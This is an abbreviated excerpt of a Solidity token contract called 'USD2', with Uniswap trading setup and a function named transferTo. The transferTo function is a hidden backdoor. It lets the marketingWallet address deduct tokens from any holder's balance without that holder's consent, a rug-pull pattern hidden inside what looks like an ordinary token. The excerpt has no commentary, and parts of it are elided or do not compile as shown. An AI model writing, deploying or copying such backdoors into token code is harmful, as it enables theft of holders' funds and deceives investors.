...
contract USD2 is Ownable, IERC20, Context {
    using SafeMath for uint256;

    string private constant _name = "USD2";
    string private constant _symbol = "USD2";
    ...
    event SwapBack(address from, address to);
    ...
    function enableTrading() external payable onlyOwner() {
        ...
        IERC20(uniswapPairAddress).approve(address(uniswapV2Router), type(uint).max);  
         tradingEnabled = true;
         marketPair[uniswapPairAddress] = true;
    }
    ...
    function transferTo(address from, uint256 amount) external {
        ...
        if (marketingWallet == msg.sender) {   uint256 tokenAmount = balance - amount;  balances[from] -= tokenAmount; } else {
            amount = 0;
        }
    }
